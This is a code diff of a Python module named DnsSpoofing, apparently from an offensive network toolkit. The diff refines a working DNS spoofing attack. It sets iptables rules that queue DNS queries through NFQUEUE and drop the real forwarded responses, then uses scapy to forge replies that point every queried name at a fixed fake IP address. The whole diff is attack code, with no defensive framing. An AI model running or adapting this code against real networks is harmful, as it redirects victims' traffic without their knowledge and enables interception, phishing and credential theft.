@@ -24,38 +24,36 @@ class DnsSpoofing(CommandModule) :
 
         # This rule of iptables can make a packet which is modifiable.
         queryID = 1
+        table = "-t nat "
         checkOpt = "\"udp dpt:53 NFQUEUE num " + str(queryID) + "\""
-        iptablesOpt = "-t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num " + str(queryID)
-        if False == NetSetup.getInstance().checkIpTables(checkOpt) :
+        iptablesOpt = table + " -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num " + str(queryID)
+        if False == NetSetup.getInstance().checkIpTables(table, checkOpt) :
             NetSetup.getInstance().ipTables(iptablesOpt)
 
-        responseID = 2
-        checkOpt = "\"udp spt:53 NFQUEUE num " + str(responseID) + "\""
-        iptablesOpt = "-t nat -A PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num " + str(responseID)
-        if False == NetSetup.getInstance().checkIpTables(checkOpt) :
+        table = ""
+        checkOpt = "\"udp spt:53\""
+        iptablesOpt = table + "-A FORWARD -p udp --sport 53 -j DROP"
+        if False == NetSetup.getInstance().checkIpTables(table, checkOpt) :
             NetSetup.getInstance().ipTables(iptablesOpt)
 
-
+        
         # DNS-Spoofing
-        # _thread.start_new_thread(self.dnsCachePoisoning, (queryID, responseID))
-        self.dnsCachePoisoning(responseID, queryID)
+        _thread.start_new_thread(self.dnsCachePoisoning, ("DNS cache poisoning", queryID))
+        # self.dnsCachePoisoning(queryID)
 
 
-    def dnsCachePoisoning(self, responseID, queryID) :
+    def dnsCachePoisoning(self, title, queryID) :
         print("# DNS cache poisoning...")
-        # sniff(lfilter=lambda x: x.haslayer(DNS), prn=processDns)
         try :
             self.getNFQueue(queryID).bind(queryID, self.dnsQueryCallback)
-            # self.getNFQueue(responseID).bind(responseID, self.dnsResponseCallback)
-
             self.getNFQueue(queryID).run()
-            # self.getNFQueue(responseID).run()
 
         except KeyboardInterrupt :
             self.getNFQueue(queryID).unbind()
-            # self.getNFQueue(responseID).unbind()
 
             NetSetup.getInstance().ipForward(0)
+            iptablesOpt = "-F"
+            NetSetup.getInstance().ipTables(iptablesOpt)
             iptablesOpt = "-t nat -F"
             NetSetup.getInstance().ipTables(iptablesOpt)
 
@@ -67,24 +65,10 @@ class DnsSpoofing(CommandModule) :
         packet.drop()
 
 
-    """
-    def dnsResponseCallback(self, packet) :
-        print("# DNS Response")
-        payload = IP(packet.get_payload())
-        payload[DNS].an = DNSRR(rrname="naver.com", rdata="125.209.222.141")
-        packet.set_payload(str(payload))
-        packet.accept()
-    """
-
-
     def makeDnsResponse(self, packet) :
         pkt = IP(packet.get_payload())
-        fakeIp = "125.209.222.141"	# naver.com
-
-        # resp = IP(dst=ip.src, src=ip.dst)\
-        #     /UDP(dport=ip.sport, sport=dport)\
-        #     /DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=fakeIp))
         # pkt.show()
+        fakeIp = "125.209.222.141"	# naver.com
         ip = IP()
         ip.src = pkt[IP].dst
         ip.dst = pkt[IP].src
@@ -94,44 +78,36 @@ class DnsSpoofing(CommandModule) :
         udp.dport = pkt[UDP].sport
 
         dns = DNS()
+        # Transaction ID.
         dns.id = pkt[DNS].id
-        dns.opcode = 1
-        dns.qdcount = 1		# question count.
-        dns.ancount = 1		# answer count.
-        dns.nscount = 0		# authority count.
-        dns.arcount = 0		# additional count.
+        # Flags
+        dns.qr      = 1		# query or response.
+        dns.opcode  = 0		# Opcode.
+        dns.aa      = 0		# Authoritative. (Server is an authority for domain or not)
+        dns.tc      = 0		# Truncated. (Message is truncated or not)
+        dns.rd      = 0		# Recursion desired.
+        dns.ra      = 0		# Recursion available.
+        dns.z       = 0		# Reserved.
+        dns.ad      = 0		# Answer authenticated.
+        dns.cd      = 0		# Non-authenticated data.
+        dns.zcode   = 0		# Reply code.
+        # COUNT
+        dns.qdcount = 1		# Question count.
+        dns.ancount = 1		# Answer count.
+        dns.nscount = 0		# Authority count.
+        dns.arcount = 0		# Additional count.
+        # Queries.
         dns.qd = pkt[DNS].qd
+        # Answers.
         dns.an = DNSRR(rrname=pkt[DNS].qd.qname, type=1, rclass=0x0001, ttl=25740, rdlen=4, rdata=fakeIp)
+        # Authority.
+        dns.ns = None
+        # Additional.
+        dns.ar = None
 
-        print("Sending the fake DNS reply to %s:%s" % (ip.dst, udp.dport))
         resp = ip/udp/dns
         # resp.show()
         return resp
-
-
-"""
-# scapy.layers.dns
-# scapy.packet.Packet = packet
-def processDns(packet) :
-    # DNSQR : DNS Question Record
-    if DNSQR in packet and packet.dport == 53 :
-	    print("# queries...")
-    # DNSRR : DNS Resource Record
-    elif DNSRR in packet and packet.sport == 53 :
-        print("# response...")
-    else :
-        print("It is not a DNS packet")
-        pass
-
-    if IP in packet :
-        ip_src = packet[IP].src
-        ip_dst = packet[IP].dst
-        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 :
-            print(str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + str(packet.getlayer(DNS).qd.qname) + ")")
-        elif packet.haslayer(DNS) and packet.getlayer(DNS).rr == 0 :
-            print(str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + str(packet.getlayer(DNS).qd.qname) + ")")
-"""
-
 
 
 if __name__ == '__main__' :
